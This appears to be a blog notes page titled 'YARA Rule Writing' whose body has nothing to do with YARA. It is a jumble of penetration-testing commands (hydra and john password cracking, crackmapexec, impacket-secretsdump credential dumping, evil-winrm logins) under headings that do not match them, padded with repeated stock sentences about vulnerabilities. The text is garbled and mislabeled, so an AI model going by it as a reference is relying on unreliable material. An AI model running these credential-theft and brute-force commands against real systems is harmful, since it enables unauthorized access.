---
TitleSEO: "YARA Rule Writing | ZureFX"
TitlePost: "YARA Rule Writing"
Author: "ZureFX"
Description: "Personal notes on YARA Rule Writing. Quick reference for pentesting and CTF challenges."
Keywords: "blue team, privilege escalation, dfir, enumeration, windows, persistence"
URL: "https://zurefx.github.io/notes/note-yara-rule-writing-162.html"
URL_IMAGES: ""
Date: "2025-09-16"
Tags: "Blue Team, Privilege Escalation, DFIR, Enumeration, Windows, Persistence"
Section: "notes"
Lang: "en"
main_img: "note-yara-rule-writing-162"
Permalink: "/notes/note-yara-rule-writing-162.html"
BtnLabel: "Read Notes"
Pick: 0
---
## LXD Privilege Escalation

### Resource-Based Constrained Delegation

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.21.89.201/FUZZ
```

```python
feroxbuster -h
crackmapexec smb 10.73.194.245 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.30.13.242 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p1521,22,80 10.63.171.28 -oN scan.txt
```

## wmiexec

### Open Redirect

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.53.209.149
evil-winrm -i 10.34.186.22 -u administrator -p 'P@ssw0rd!'
```

The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit.

## Windows Server 2019

### Pass the Ticket

Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.90.228.196 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.73.208.14 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service.

## Ruby on Rails

### Unconstrained Delegation

```powershell
crackmapexec smb 10.55.85.64 -u administrator -p 'P@ssw0rd!' --shares
```

The backup files contained sensitive information that should not have been accessible. The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities. The kernel version was outdated and vulnerable to a publicly known exploit.

Post-exploitation enumeration revealed a path to domain administrator privileges. The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target.

Authentication bypass was achieved through careful manipulation of the login mechanism. The database credentials were hardcoded in the application source code.

- `SeDebugPrivilege`
- `Unquoted Service Path`
- `Writable PATH`
- `GetUserSPNs`
- `Resource-Based Constrained Delegation`

## sqlmap

### hydra

The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
nmap -sCV -p1521,636,135 10.39.10.184 -oN scan.txt
```

## LAPS Abuse

### bloodhound

```bash
crackmapexec smb 10.121.196.143 -u administrator -p 'P@ssw0rd!' --shares
```

- `wmiexec`
- `Kerberoasting`
- `Pass the Hash`
- `Constrained Delegation`
- `Open Redirect`

- `metasploit`
- `SSTI`
- `SeDebugPrivilege`
- `Golden Ticket`
- `AS-REP Roasting`
- `smbexec`
